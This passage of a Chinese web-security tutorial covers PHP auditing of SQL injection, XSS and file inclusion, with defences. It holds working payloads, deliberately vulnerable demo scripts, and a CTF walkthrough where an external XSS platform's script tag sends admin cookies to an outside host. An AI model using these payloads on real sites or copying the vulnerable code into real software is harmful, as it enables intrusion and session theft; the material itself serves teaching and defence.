class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span> from <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><h5 id="利用order-by盲注"><a href="#利用order-by盲注" class="headerlink" title="利用order by盲注"></a>利用order by盲注</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;5&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------+------------------------</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span>    username  <span class="hljs-operator">|</span> password                   <br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------+------------------------</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> <span class="hljs-number">2</span>            <span class="hljs-operator">|</span> <span class="hljs-number">5</span>                         <br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> admin        <span class="hljs-operator">|</span> <span class="hljs-number">51</span>b7a76d51e70b419f60d34 <br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------- --+------------------------</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br>    <br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;6&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-operator">|</span>id   <span class="hljs-operator">|</span> username  <span class="hljs-operator">|</span> password                  <br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span>  <span class="hljs-operator">|</span> admin     <span class="hljs-operator">|</span><span class="hljs-number">51</span>b7a76d51e70b419f60d3<br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span>  <span class="hljs-operator">|</span>    <span class="hljs-number">2</span>      <span class="hljs-operator">|</span> <span class="hljs-number">6</span>                          <br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><ul>
<li>相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。</li>
<li>一般格式if((bool),sleep(3),0)和or (case when (bool) then sleep(3) else 0 end)</li>
<li>两个函数：</li>
<li>BENCHMARK(100000,MD5(1))</li>
<li>sleep(5)</li>
<li>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源，推荐使用sleep()。</li>
</ul>
<h3 id="Mysql注释符"><a href="#Mysql注释符" class="headerlink" title="Mysql注释符"></a>Mysql注释符</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span> <span class="hljs-comment">-- -</span><br><span class="hljs-number">2.</span> <span class="hljs-comment">/* .... */</span><br><span class="hljs-number">3.</span> #<br><span class="hljs-number">4.</span> `<br><span class="hljs-number">5.</span> ;<span class="hljs-operator">%</span><span class="hljs-number">00</span> <br></code></pre></td></tr></table></figure>

<h3 id="GBK绕过注入"><a href="#GBK绕过注入" class="headerlink" title="GBK绕过注入"></a>GBK绕过注入</h3><ul>
<li>在分号前加%df%27</li>
<li>示例：id&#x3D;1%df%27 union select 1.2–+</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以HDWiki v6.0 UTF8-20170209 前台sql注入为例，index.php?doc-create创建词条可以通过<code>aaaa……aa&#39;</code> 81个字符，经过转义变成<code>aaaa……aa\&#39;</code>82个字符，经过截断变成<code>aaaa……aa\</code>81个字符，将sql语句中的单引号转义，并且后面一个参数用户可控，产生了SQL注入</p>
<p><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;</code></p>
<p><code>，concat(user(),0x7c,database(),0x7c,version()),1,1,#</code></p>
<h3 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h3><h4 id="gpc-x2F-rutime魔术引号"><a href="#gpc-x2F-rutime魔术引号" class="headerlink" title="gpc&#x2F;rutime魔术引号"></a>gpc&#x2F;rutime魔术引号</h4><ul>
<li>magic_quotes_gpc负责对GET、POST、COOKIE的值进行过滤</li>
<li>magic_quotes_runtime对从数据库或者文件中获取的数据进行过滤。上面的二次注入可以使用这个函数对特殊符号转义</li>
</ul>
<p>开启这两个选项也只能防御部分SQL注入。因为他们只对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>空字符</code>进行转义,在int型注入上没有太大作用。</p>
<h4 id="过滤函数和类"><a href="#过滤函数和类" class="headerlink" title="过滤函数和类"></a>过滤函数和类</h4><h5 id="addslashes函数"><a href="#addslashes函数" class="headerlink" title="addslashes函数"></a>addslashes函数</h5><p>addslashes也是对<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>空字符</code>进行转义，大多数程序使用它实在程序入口，判断如果没有没有开启gpc,则使用它对参数进行过滤,不过他的参数必须是string,所以如果参数是数组类型,那么必须使用此函数对数组递归过滤。</p>
<h5 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_[real]_escape_string"></a>mysql_[real]_escape_string</h5><p>mysql_escape_string和mysql_real_escape_string函数都是对字符串进行过滤,在php4.0.3以上版本才有这两个函数,<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\x1a</code>。不同在于mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转义字符串,所以最好使用mysql_real_escape_string。</p>
<p>mysql_escape_string</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$item</span> = <span class="hljs-string">&quot;Zak&#x27;s Laptop&quot;</span>;<br><span class="hljs-variable">$escaped_item</span> = <span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$item</span>);<br></code></pre></td></tr></table></figure>

<p>mysql_real_escape_string</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-variable">$item</span> = <span class="hljs-string">&quot;Zak&#x27;s Laptop&quot;</span>;<br><span class="hljs-variable">$escaped_item</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$item</span>,<span class="hljs-variable">$conn</span>);<br></code></pre></td></tr></table></figure>

<h6 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h6><p>将字符转换成数值</p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;1 union select&#x27;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure>

<h4 id="PDO预编译方式"><a href="#PDO预编译方式" class="headerlink" title="PDO预编译方式"></a>PDO预编译方式</h4><p>使用PDO方式基本可以防止sql注入,原因是因为有两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。但是还是存在特殊情况会在使用了PDO方式也会存在注入,可以参考<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218">https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218</a></p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br>	<span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=test&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br><span class="hljs-variable">$sta</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;select * from table where name = ?&#x27;</span>); <span class="hljs-comment">//准备 SQL 模版，其中 ? 代表一个参数。</span><br><span class="hljs-variable">$sta</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name1&#x27;</span>)); <span class="hljs-comment">//通过数组设置参数，执行 SQL 模版</span><br></code></pre></td></tr></table></figure>



<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><h3 id="成因与危害"><a href="#成因与危害" class="headerlink" title="成因与危害"></a>成因与危害</h3><p>参数没有被过滤或严格过滤,且参数传入到了输出函数,被输出到了页面。常出现在文章发表、评论回复、留言、资料修改等地方。</p>
<p>可能产生如下危害:</p>
<ul>
<li>窃取cookie</li>
<li>修改页面进行钓鱼</li>
<li>前端能做的事情,xss都能做到</li>
</ul>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型、存储型、dom型</p>
<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>经过了后端,但是没有经过经过数据库。</p>
<p>数据流向: 浏览器 -&gt; 后端 -&gt; 浏览器</p>
<p>eg:</p>
<p>reflectxss.php(test on mysql 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">XSS反射演示<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;xss&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$xss</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xss&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$xss</span>!==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$xss</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/reflectxss.php?xss=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p>
<p>恶意利用(以获取用户cookie为例):<br>比如<code>http://xxx.com/xxx.php?aaa=攻击者编写的获取用户cookie的代码</code>存在反射型xss,<br>攻击者可以把构造好的链接发到论坛或者其他方式诱导用户点击,如果用户点击了链接,那么用户的cookie会被攻击者的服务器收到,攻击者可以利用用户的cookie登陆目标网站</p>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>数据经过了后端,经过了数据库。</p>
<p>数据流向: 浏览器-&gt; 后端-&gt; 数据库-&gt; 后端-&gt; 浏览器</p>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table xss (<br>    id int(10) unsigned NOT NULL AUTO_INCREMENT,<br>    payload varchar(100) NOT NULL,<br>    PRIMARY KEY (id)<br>)ENGINE=MyISAM DEFAULT CHARSET=utf8;<br></code></pre></td></tr></table></figure>

<p>storagexss.php(test on mysql 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">\\存储XSS演示<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;xss&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xss</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xss&#x27;</span>];<br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$xss</span>!==<span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into xss(id,payload) values(1,&#x27;<span class="hljs-subst">$xss</span>&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>storagexsshow.php(test on mysql 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select payload from xss&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>storagexss.php post:<code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>访问storagexsshow.php会弹出cookie</p>
<p>恶意利用(以评论区存在存储型xss为例):假如某网站评论区存在xss存储行漏洞,攻击者在评论中插入获取cookie的代码,当每个用户看到此评论时,他们的cookie都会被发送到攻击者服务器。</p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>没有经过后端,只在前端触发。</p>
<p>数据流向是：URL–&gt;浏览器 </p>
<p>eg:</p>
<p>domxss.php(test on mysql 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//禁用错误报告</span><br><span class="hljs-variable">$q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;q&quot;</span>];<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;q&quot;</span> id=<span class="hljs-string">&#x27;text&#x27;</span> value=<span class="hljs-string">&quot;&lt;?php echo <span class="hljs-subst">$q</span>;?&gt;&quot;</span> /&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;test&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;div id=<span class="hljs-string">&quot;print&quot;</span>&gt;&lt;/div&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">var</span> text = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;text&quot;</span>); <br><span class="hljs-keyword">var</span> <span class="hljs-keyword">print</span> = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;print&quot;</span>);<br><span class="hljs-keyword">print</span>.innerHTML = text.value + <span class="hljs-string">&#x27; not found&#x27;</span>; <span class="hljs-comment">// 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/domxss.php?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E</code></p>
<p>恶意利用和反射型xss类似</p>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>以ESPCMS P8.18101601n 前台XSS为例，问题主要由于错误页面的报错信息未作过滤，造成XSS漏洞。</p>
<p>payload:<code>http://127.0.0.1/espcms/index.php?ac=%3C/code%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;at=List&amp;tid=7</code></p>
<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><ul>
<li>特殊字符HTML实体编码</li>
<li>标签黑白名单(推荐白名单,黑名单可能存在不可预测的绕过)</li>
<li>请求头设置HttpOnly属性(cookie不能通过js调用获取)</li>
</ul>
<h3 id="XSS-平台使用简要教程"><a href="#XSS-平台使用简要教程" class="headerlink" title="XSS 平台使用简要教程"></a>XSS 平台使用简要教程</h3><h4 id="找一个xss接收平台，并完成注册等一系列操作"><a href="#找一个xss接收平台，并完成注册等一系列操作" class="headerlink" title="找一个xss接收平台，并完成注册等一系列操作"></a>找一个xss接收平台，并完成注册等一系列操作</h4><p>这里以 <a target="_blank" rel="noopener" href="https://xsshs.cn/">https://xsshs.cn/</a> 做例子</p>
<p><img src="https://s2.ax1x.com/2020/02/07/12BSxg.png" srcset="/img/loading.gif" lazyload alt="12BSxg.png"></p>
<p>登陆平台</p>
<h4 id="创建和配置项目"><a href="#创建和配置项目" class="headerlink" title="创建和配置项目"></a>创建和配置项目</h4><p><img src="https://s2.ax1x.com/2020/02/07/12B9MQ.png" srcset="/img/loading.gif" lazyload alt="12B9MQ.png"></p>
<p><img src="https://s2.ax1x.com/2020/02/07/12BCrj.png" srcset="/img/loading.gif" lazyload alt="12BCrj.png"></p>
<p>填写好项目名称和描述（自定义）</p>
<p>然后进行配置：</p>
<p><img src="https://s2.ax1x.com/2020/02/07/120Oat.png" srcset="/img/loading.gif" lazyload alt="120Oat.png"></p>
<p>比如这里我们需要获取管理员的cookie，就勾上<img src="https://s2.ax1x.com/2020/02/07/120LVI.png" srcset="/img/loading.gif" lazyload alt="120LVI.png"></p>
<p>点击下一步</p>
<p>就会进入到项目代码，注意，上面的代码都是已经封装好的了，包括接收url什么的，我们直接使用就可以了。</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><img src="https://s2.ax1x.com/2020/02/07/120I2D.png" srcset="/img/loading.gif" lazyload alt="120I2D.png"></p>
<p>比如我们随便挑一个最简单的来使用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;sCrIpt srC=<span class="hljs-comment">//xs.sb/boJN&gt;&lt;/sCRipT&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们以C1CTF的xss题目来做例子</p>
<p><img src="https://s2.ax1x.com/2020/02/07/120Hrd.png" srcset="/img/loading.gif" lazyload alt="120Hrd.png"></p>
<p>将代码复制到你觉得可能会产生xss的地方，这里点提交后，保存了在一个页面</p>
<p><img src="https://s2.ax1x.com/2020/02/07/1204PK.png" srcset="/img/loading.gif" lazyload alt="1204PK.png"></p>
<p>当有用户（带cookie）访问这个页面的时候，此用户的cookie就会被获取并且发送到我们的平台，一般来说我们需要admin的cookie。这题的逻辑是直接发送页面id让管理员检查</p>
<p><img src="https://s2.ax1x.com/2020/02/07/120vPf.png" srcset="/img/loading.gif" lazyload alt="120vPf.png"></p>
<p>然后就等着接收就可以了。</p>
<h4 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h4><p>在平台里的项目内容里就可以查看到xss的结果了</p>
<p><img src="https://s2.ax1x.com/2020/02/07/120xG8.png" srcset="/img/loading.gif" lazyload alt="120xG8.png"></p>
<h3 id="收集常见的XSS-payload"><a href="#收集常见的XSS-payload" class="headerlink" title="收集常见的XSS payload"></a>收集常见的XSS payload</h3><p><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/112152/Cross-Site-Scripting-Payloads.html">Cross-Site-Scripting-Payloads</a></p>
<h2 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h2><p>总的来说时因为没有经过严格的验证,操作的文件是否在允许的范围内。</p>
<p>危害:</p>
<ul>
<li>导致恶意文件&#x2F;代码包含</li>
<li>导致敏感文件被读取</li>
<li>导致文件被删除</li>
<li>导致恶意文件上传</li>
</ul>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含分为本地文件包含(local file include)、远程文件包含(remote file include)。文件包含可以导致恶意代码被包含,从而获取webshell</p>
<p>文件包含利用函数:</p>
<ul>
<li>include(即使文件被包含过,也会再次包含,包含文件遇到错误代码也会继续执行)</li>
<li>include_once(文件被包含过了,就不会再次包含,包含文件遇到错误也会继续执行)</li>
<li>require(即使文件被包含过,也会再次包含,包含文件遇到错误程序直接退出)</li>
<li>require_once(文件被包含过了,就不会再次包含,包含文件遇到错误程序直接退出)</li>
<li>…</li>
</ul>
<p>本地文件包含(LFI):</p>
<p>只能包含本机文件,大多出现在模块加载、模板加载和cache调用等地方。<br>本地文件包含方式也有多种,比如上传一个允许上传的文件格式的文件在包含,包含PHP上传的临时文件,webserver记录到日志后在包含webserver的日志,linux下可以包含&#x2F;proc&#x2F;self&#x2F;environ文件等。</p>
<p>eg:<br>localfileinclude.php(test on php 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;ROOT&quot;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-variable">$mod</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mod&#x27;</span>];<br><span class="hljs-keyword">echo</span> ROOT.<span class="hljs-variable">$mod</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">include</span>(ROOT.<span class="hljs-variable">$mod</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>lfishell.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/localfileinclude.php?mod=lfishell</code></p>
<p>远程文件包含:</p>
<p>可以包含远程文件。需要设置allow_url_include&#x3D;on。支持http、ftp、php伪协议、zip、file等协议。</p>
<p>eg:</p>
<p>remotefileinclude.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>使用python开启一个见到的服务器:<br><code>python -m SimpleHTTPServer 8080</code></p>
<p>rfi.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/remotefileinclude.php?url=http://127.0.0.1:8080/Desktop/rfi.txt</code></p>
<p>使用伪协议(举两个伪协议例子):</p>
<p>php:&#x2F;&#x2F;input</p>
<ul>
<li>allow_url_fopen：off&#x2F;on</li>
<li>allow_url_include：on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://input</code><br><code>post: &lt;?php phpinfo();?&gt;</code></li>
</ul>
<p>php:&#x2F;&#x2F;filter</p>
<ul>
<li>allow_url_fopen：off&#x2F;on</li>
<li>allow_url_include：off&#x2F;on<br><code>http://127.0.0.1/remotefileinclude.php?url=php://filter/read=convert.base64-encode/resource=remotefileinclude.php</code></li>
</ul>
<p>截断包含:</p>
